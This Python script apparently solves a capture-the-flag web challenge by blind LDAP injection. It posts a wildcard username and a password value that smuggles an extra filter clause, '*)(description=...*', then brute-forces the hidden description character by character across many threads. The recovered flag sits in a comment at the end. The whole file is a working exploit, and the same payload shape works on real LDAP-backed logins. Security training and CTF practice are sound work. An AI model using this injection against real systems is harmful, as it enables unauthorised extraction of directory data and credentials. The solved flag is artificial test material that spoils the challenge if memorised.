import requests
from myutils import multithread_run

url = "https://lightweight.chal.bts.wh.edu.pl/"
flag_guess = "BtSCTF{"
charset = "abcdefghijklmnopqrstuvwxyz0123456789!$%&'+,-./:;<=>?@^_`|}~\\"
skip = False


def check(flag):
    global flag_guess, skip
    if skip:
        return False
    try:
        resp = requests.post(url, data={
            "username": "*",
            "password": f"*)(description={flag}*",
        })
        if resp.status_code == 200:
            flag_guess = flag
            print(f"{flag_guess}\n", end=" ")
            skip = True
            return True
        else:
            return False
    except:
        print(f"[!] {flag}\n", end=" ")
        return False


while not flag_guess.endswith("}"):
    skip = False
    args_list = [(flag_guess + ch,) for ch in charset]
    multithread_run(check, args_list, max_threads=26)

# BtSCTF{_bl1nd_ld4p_1nj3ct10n_y1pp333333}
